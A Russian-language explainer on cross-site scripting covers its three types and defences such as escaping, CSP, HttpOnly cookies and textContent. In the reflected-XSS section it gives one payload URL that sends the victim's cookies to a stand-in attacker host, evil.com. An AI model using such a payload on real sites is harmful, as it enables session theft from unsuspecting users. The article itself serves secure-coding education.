## Что такое XSS и почему это опасно

**XSS** (Cross-Site Scripting) – атака, при которой злоумышленник внедряет вредоносный JavaScript-код в страницу, которую видят другие пользователи. Ключевая особенность: атака направлена не на сервер, а на браузер пользователя, который доверяет вашему сайту.

При успешной атаке скрипт выполняется в контексте вашего домена и получает доступ к `document.cookie`, токенам авторизации, данным страницы и всему, что видит пользователь.

---

## Тип 1: Reflected XSS – отражённый

Скрипт передаётся в запросе (обычно через URL-параметр), сервер вставляет его в HTML-ответ, браузер исполняет. Сервер ничего не сохраняет – он просто «отражает» вредоносный код обратно.

`https://bank.com/search?q=<script>document.location='https://evil.com?c='+document.cookie</script>`

Сервер берёт значение параметра `q` и вставляет его в страницу результатов поиска. Браузер видит тег `<script>` и выполняет его. Куки уходят на сервер злоумышленника.

Атака требует, чтобы жертва перешла по специально подготовленной ссылке – обычно её присылают через почту или мессенджер.

---

## Тип 2: Stored XSS – хранимый

Самый опасный вариант. Вредоносный скрипт сохраняется в базе данных – в поле комментария, имени профиля, тексте поста. После этого он выполняется в браузере каждого, кто откроет заражённую страницу, без каких-либо дополнительных действий злоумышленника.

Атака становится массовой и автоматической: злоумышленник один раз разместил скрипт – и теперь все посетители страницы становятся жертвами.

---

## Тип 3: DOM-based XSS – атака в браузере

Этот тип полностью происходит на стороне клиента: вредоносные данные не отправляются на сервер вообще. Уязвимость – в клиентском JavaScript, который небезопасно читает данные из окружения браузера.

Типичный источник – фрагмент URL (часть после `#`). Данные после `#` браузер не отправляет серверу, поэтому серверные фильтры их не видят. Если ваш JS читает `location.hash` и вставляет значение в DOM через `innerHTML` – возникает уязвимость.

---

## Три типа в сравнении

Reflected XSS: скрипт живёт в URL, сервер отражает его в ответе, воздействие точечное – нужно, чтобы жертва перешла по ссылке.

Stored XSS: скрипт хранится в базе данных, сервер раздаёт его всем, воздействие массовое.

DOM-based XSS: скрипт обрабатывается клиентским JavaScript, сервер не участвует, воздействие зависит от условий в браузере.

## Защита

**Экранирование вывода** – основная линия обороны. Любые данные от пользователя перед вставкой в HTML нужно экранировать: символы `<`, `>`, `"` заменяются на HTML-сущности `&lt;`, `&gt;`, `&quot;`. Браузер отображает их как текст и не пытается выполнить как код.

```python
from markupsafe import escape

name = escape(user_input)  # <script> → &lt;script&gt;
```

В Django шаблонах `{{ user_input }}` экранирует автоматически. Фильтр `{{ user_input | safe }}` отключает это экранирование – использовать только для заведомо доверенного контента.

**Content Security Policy (CSP)** – заголовок ответа, который ограничивает, откуда браузер может загружать и выполнять скрипты:

`Content-Security-Policy: script-src 'self'; object-src 'none'`

`script-src 'self'` разрешает скрипты только с вашего домена и блокирует inline-скрипты.

`object-src 'none'` закрывает вектор через устаревшие плагины. Даже если XSS-уязвимость есть, CSP не даст скрипту загрузиться с чужого домена.

**`HttpOnly`-флаг на куках** – делает куки невидимыми для JavaScript. `document.cookie` их не покажет. Это критически важная защита в глубину: даже при успешном XSS злоумышленник не сможет украсть сессию.

`Set-Cookie: session=abc123; HttpOnly; Secure`

**Безопасное манипулирование DOM** – при написании клиентского кода `innerHTML` и `eval()` интерпретируют строку как HTML или JavaScript. `textContent` вставляет данные как текст без интерпретации. Если не нужна разметка – всегда используйте `textContent`.
